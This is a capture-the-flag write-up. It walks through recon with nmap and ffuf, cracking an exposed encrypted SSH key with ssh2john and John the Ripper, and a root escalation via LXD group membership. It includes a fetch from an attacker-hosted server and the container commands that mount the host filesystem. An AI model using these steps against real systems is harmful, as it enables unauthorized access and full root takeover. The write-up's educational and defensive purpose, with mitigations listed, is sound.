# 🎮 Game Server - CTF Writeup

**Difficulty:** Medium  
**Target:** Game Server Machine  
**Objective:** User flag → Root flag

---

## 📋 Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Initial Access](#initial-access)
3. [User Flag](#user-flag)
4. [Privilege Escalation](#privilege-escalation)
5. [Root Flag](#root-flag)
6. [Lessons Learned](#lessons-learned)

---

## 🔍 Reconnaissance

### Port Scanning

Started with an Nmap scan to identify open ports and services:

```bash
nmap -sC -sV -oN nmap_scan.txt <TARGET_IP>
```

**Results:**
- **Port 22 (SSH)** - OpenSSH
- **Port 80 (HTTP)** - Web server

### Web Enumeration

#### Directory Fuzzing

Used `ffuf` to discover hidden directories:

```bash
ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

**Interesting findings:**

1. **`/robots.txt`** - Found reference to `/uploads/` directory
2. **`/secret`** - Discovered a secret page
3. **`/uploads/`** - Contains a wordlist file

---

## 🚪 Initial Access

### Finding SSH Credentials

#### 1. Discovered SSH Private Key

Navigated to `/secret` and found an **encrypted SSH private key** (`id_rsa`):

```bash
curl http://<TARGET_IP>/secret
```

Downloaded the key:

```bash
wget http://<TARGET_IP>/secret/id_rsa
chmod 600 id_rsa
```

#### 2. Found Passphrase Wordlist

The `/uploads/` directory contained a wordlist that appeared to be potential passphrases.

```bash
wget http://<TARGET_IP>/uploads/wordlist.txt
```

#### 3. Cracking the SSH Key

Since the private key was encrypted, used **ssh2john** to extract the hash:

```bash
ssh2john id_rsa > id_rsa.hash
```

Cracked the passphrase using John the Ripper:

```bash
john --wordlist=wordlist.txt id_rsa.hash
```

**Result:** Passphrase found: `letmein`

#### 4. SSH Access

Connected via SSH using the cracked credentials:

```bash
ssh -i id_rsa john@<TARGET_IP>
# Enter passphrase: letmein
```

✅ **Successfully gained SSH access!**

---

## 🏁 User Flag

After logging in as user `john`, located the user flag:

```bash
ls -la
cat user.txt
```

**User flag obtained!** 🎉

---

## ⬆️ Privilege Escalation

### Initial Enumeration

Performed standard privilege escalation checks:

```bash
# Check sudo privileges
sudo -l

# Search for SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Check for backup files
find / -name "*.bak" 2>/dev/null
find / -name "*backup*" 2>/dev/null

# Check writable files
find / -writable -type f 2>/dev/null
```

**Result:** Nothing immediately exploitable found.

### Group Membership Discovery

Checked user group memberships:

```bash
id
```

**Output:**
```
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

🔴 **Critical Finding:** User is a member of the **`lxd`** group!

---

### LXD Privilege Escalation

The `lxd` group membership allows container management, which can be exploited for privilege escalation.

#### Step 1: Prepare Alpine Image (On Attacker Machine)

```bash
# Clone the Alpine builder
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder

# Build the Alpine image
sudo ./build-alpine

# Transfer to target
python3 -m http.server 8000
```

#### Step 2: Download Image on Target

```bash
cd /tmp
wget http://<ATTACKER_IP>:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

#### Step 3: Import Image into LXD

```bash
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc image list
```

#### Step 4: Initialize LXD (if needed)

```bash
lxd init
# Accept default settings by pressing Enter
```

#### Step 5: Create Privileged Container

```bash
# Create privileged container
lxc init myimage ignite -c security.privileged=true

# Mount host root filesystem inside container
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

# Start the container
lxc start ignite
```

#### Step 6: Execute Shell in Container

```bash
lxc exec ignite /bin/sh
```

#### Step 7: Access Host Filesystem as Root

```bash
# Inside the container (you are now root!)
whoami
# root

# Navigate to host root directory
cd /mnt/root/root

# List files
ls -la
```

---

## 👑 Root Flag

Located and read the root flag:

```bash
cat /mnt/root/root/root.txt
```

**Root flag:** `2e337b8c9f3aff0c2b3e8d4e6a7c88fc`

🎉 **Root access achieved!**

---

## 🎓 Lessons Learned

### Key Takeaways

1. **Always check `robots.txt`** - It can reveal hidden directories
2. **Wordlists found on the target** - May be used for password/passphrase cracking
3. **Encrypted SSH keys** - Use `ssh2john` + `john` for cracking
4. **Group membership matters** - Always check `id` command output
5. **LXD group = Root access** - Members of `lxd` can escalate to root via container exploitation

### Vulnerability Summary

| Stage | Vulnerability | Tool Used |
|-------|---------------|-----------|
| Initial Access | Exposed SSH key + weak passphrase | ffuf, ssh2john, john |
| Privilege Escalation | LXD group misconfiguration | lxc, Alpine Linux image |

### Mitigation Recommendations

1. **Don't expose sensitive files** (like SSH keys) on web servers
2. **Use strong passphrases** for encrypted SSH keys
3. **Limit group memberships** - Don't add unprivileged users to `lxd` or `docker` groups
4. **Implement proper access controls** on web directories
5. **Use AppArmor/SELinux** for additional container isolation

---

## 🛠️ Tools Used

- **Nmap** - Port scanning
- **ffuf** - Directory enumeration
- **ssh2john** - SSH key hash extraction
- **John the Ripper** - Password cracking
- **LXD/LXC** - Container exploitation
- **wget/curl** - File transfers

---

**Thank you for reading! 🎮**

*Remember: Always get proper authorization before testing on any system.*